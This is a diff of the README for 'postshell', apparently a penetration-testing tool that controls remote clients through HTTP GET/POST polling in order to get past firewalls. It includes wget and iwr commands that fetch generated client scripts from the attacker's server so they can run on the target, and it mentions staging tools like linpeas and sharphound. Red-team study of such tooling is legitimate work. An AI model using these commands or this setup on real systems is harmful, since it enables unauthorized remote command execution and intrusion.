@@ -11,10 +11,13 @@ Execute commands on clients using GET/POST requests. (Bypass Firewalls)
 There are some limitations, however, can be very useful if firewall is blocking standard reverse shells.
 
 How postshell works:
-  - Listens for http requests on a user specified port
-  - Generates a web request script `(sh, py, ps1)`
-  - Client scripts connect to the server using POST requests, submitting machine information
-  - Client scripts continue to GET commands from the server, execute the commands, then POST results back to the server 
+  - POSTSHELL listens on a "USER SPECIFIED PORT"
+  - POSTSHELL generates web request scripts `(sh, py, ps1)` for clients
+  - POSTSHELL creates a directory called `tools/`, where it will place the "CLIENT SCRIPTS" and it's also a directory that can be downloaded from
+    - (EX: http://127.0.0.1/tools/127_0_0_1_80.sh) 
+  - Client scripts submit SYSTEM info using `POST` requests
+  - Client scripts will continue to `GET` commands from the POSTSHELL server, execute the commands, then `POST` results back to the server
+  - POSTSHELL keeps session logs for each client in `session_logs/`
 
 # Disclaimer
 This is only for testing purposes, not intended for anything illegal.
@@ -56,7 +59,7 @@ Payload Menu Commands:
 ```
 
 Generate a Client script that creates a directory called "tools" with the scripts
-    - This server also allows GET requests from "tools"
+    - This server also allows `GET` requests from `tools/`
     - You can also store other tools needed (ex: winpeas, linpeas, sharphound, etc)
 ```
 postshell> payload 
@@ -83,11 +86,9 @@ payload> generate
 
 Transfer the client script
 ```
-wget http://127.0.0.1:80/tools/127_0_0_1_80.sh
+wget http://127.0.0.1/tools/127_0_0_1_80.sh
 
-wget http://127.0.0.1:80/tools/127_0_0_1_80.py
-
-iwr http://127.0.0.1:80/tools/127_0_0_1_80.ps1 -outfile 127_0_0_1_80.ps1
+iwr http://127.0.0.1/tools/127_0_0_1_80.ps1 -outfile 127_0_0_1_80.ps1
 ```
 
 Execute the script on the client
